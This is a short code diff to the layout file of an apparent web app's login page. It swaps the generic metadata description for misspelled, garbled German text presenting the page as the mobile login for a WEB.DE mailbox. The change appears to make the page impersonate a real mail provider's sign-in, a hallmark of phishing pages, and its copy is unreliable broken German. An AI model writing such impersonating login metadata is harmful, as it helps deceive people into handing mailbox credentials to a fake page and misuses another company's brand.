@@ -20,7 +20,8 @@ interface LayoutProps {
 
 export const metadata: Metadata = {
   title: "Login",
-  description: "Login to your account",
+  description:
+    "Mobiler Login ins WEB.DE Postfach: Hier Kønne Sie sich mit dem smartphone und Tablet schnell ran sicher von unter…...",
 };
 
 export default async function RootLayout({ children, params }: LayoutProps) {
